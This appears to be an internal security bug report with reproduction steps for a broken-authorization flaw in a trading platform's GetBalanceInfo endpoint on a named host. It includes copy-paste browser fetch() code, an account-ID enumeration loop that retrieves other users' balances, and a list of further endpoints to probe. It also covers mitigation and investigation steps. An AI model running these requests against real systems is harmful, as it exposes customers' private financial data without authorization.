# Reproduction Steps: GetBalanceInfo Unauthorized Access

**Difficulty:** TRIVIAL  
**Time Required:** < 5 minutes  
**Tools Required:** Web browser, DevTools (F12)  
**Reproducibility:** 100% (verified on multiple environments)  
**Status:** ⚠️ **CONFIRMED ON MULTIPLE ENVIRONMENTS** (not just staging)  

## Prerequisites

- Active browser session authenticated at any affected environment (etna-demo-ci-int.etnasoft.us + others)
- Any valid user account (does not require admin or special privileges)
- Browser with DevTools support (Chrome, Edge, Firefox, Safari)

## Step-by-Step Reproduction

### Step 1: Log In to Environment

Navigate to the target environment (e.g., `https://etna-demo-ci-int.etnasoft.us`, or any other affected environment) and authenticate with valid credentials.  
Confirm successful login (you see trading dashboard).

### Step 2: Open Browser DevTools

- **Chrome/Edge:** Press `F12` or right-click → "Inspect"
- **Firefox:** Press `F12` or right-click → "Inspect"
- **Safari:** Press `Cmd+Option+I` (Mac) or right-click → "Inspect"

### Step 3: Navigate to Console Tab

In DevTools, click the **Console** tab.

### Step 4: Execute Vulnerable API Call

Copy and paste the following code into the console and press Enter:

```javascript
fetch("https://etna-demo-ci-int.etnasoft.us/Account/GetBalanceInfo", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/json",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Chromium\";v=\"146\", \"Not-A.Brand\";v=\"24\", \"Google Chrome\";v=\"146\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "x-requested-with": "XMLHttpRequest"
  },
  "referrer": "https://etna-demo-ci-int.etnasoft.us/",
  "body": "{\"accountId\":10}",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
}).then(r => r.json()).then(d => console.log(JSON.stringify(d, null, 2)));
```

**Explanation:**
- **IMPORTANT:** Replace `https://etna-demo-ci-int.etnasoft.us` with your current environment domain (must match browser domain)
- Change `"accountId":10` to any positive integer (1, 5, 100, 1480, etc.) that belongs to another user
- The `credentials: "include"` ensures your auth cookie is sent
- `.then()` handlers automatically parse JSON and pretty-print to console

### Step 5: Observe Vulnerable Response

**EXPECTED (should be):** 401 Unauthorized or 403 Forbidden

**ACTUAL (buggy behavior):** 200 OK with account balance data:

```json
{
  "items": [
    {
      "Name": "cash",
      "Value": -60436891.69
    },
    {
      "Name": "netCash",
      "Value": 9012.21
    },
    {
      "Name": "buying_power_dtbp",
      "Value": 1000000.00
    }
  ]
}
```

### Step 6: Verify via Network Tab

For deeper inspection:

1. Click the **Network** tab in DevTools
2. Repeat steps 4–5
3. Look for the request to `/Account/GetBalanceInfo`
4. Verify:
   - **Status:** 200 (should be 401/403)
   - **Response:** Contains account balance data
   - **Method:** POST
   - **Payload:** `{"accountId":10}` (or whatever ID you tested)

## Evidence Collection

### Screenshot Checklist

- [ ] Browser logged into `etna-demo-ci-int.etnasoft.us`
- [ ] DevTools Console showing successful API response
- [ ] DevTools Network tab showing 200 status code
- [ ] JSON response visible with balance data
- [ ] URL bar showing correct domain
- [ ] Timestamp showing current time

### Expand Testing

**Test Multiple Account IDs:**

```javascript
for (let id of [1, 5, 10, 50, 100, 1480]) {
  fetch("https://etna-demo-ci-int.etnasoft.us/Account/GetBalanceInfo", {
    "headers": { "content-type": "application/json" },
    "body": JSON.stringify({"accountId": id}),
    "method": "POST",
    "mode": "cors",
    "credentials": "include"
  }).then(r => r.json()).then(d => console.log(`Account ${id}:`, d));
}
```

This will show that:
- Many different `accountId` values return 200 OK
- Each returns valid balance data
- No authorization on any of them

## Expected vs. Actual Behavior

| Scenario | Expected | Actual |
|----------|----------|--------|
| User A queries User A's account | 200 OK + data | 200 OK + data ✓ |
| User A queries User B's account | 403 Forbidden | 200 OK + data ✗ **VULNERABILITY** |
| Unauthenticated user queries any account | 401 Unauthorized | 401 Unauthorized ✓ |

## Security Implications

The vulnerability allows:

1. **Account Enumeration:** Attacker can iterate through account IDs to find how many accounts exist
2. **Balance Harvesting:** Attacker can collect balance data for competitive intelligence
3. **Sub-account Targeting:** Attacker can map firm structures by accessing sub-accounts
4. **Lateral Privilege Escalation:** Attacker switches from customer role to firm/admin view without proper authorization

## Related Endpoints

After confirming this vulnerability, test similar endpoints:

```javascript
// Potentially vulnerable
fetch("/Account/GetAccountInfo", { /* ... */ });
fetch("/Account/GetPositions", { /* ... */ });
fetch("/Account/GetTransactionHistory", { /* ... */ });
fetch("/Account/GetMarginInfo", { /* ... */ });
fetch("/Account/GetCashMovement", { /* ... */ });
```

**Note:** These may not exist or may have different implementations. Test only in staging environment.

## Mitigation (Temporary)

Until backend fix is deployed:

- Disable public access to `/Account/GetBalanceInfo` endpoint in load balancer/WAF
- Monitor API logs for suspicious `GetBalanceInfo` calls with unusual `accountId` parameters
- Block endpoint at API gateway if available

## Next Investigation Steps

1. [ ] Identify all Account/* endpoints
2. [ ] Test each for authorization bypass
3. [ ] Locate controller source code
4. [ ] Find missing authorization check (code review)
5. [ ] Determine if issue exists in production
6. [ ] Audit access logs for exploitation
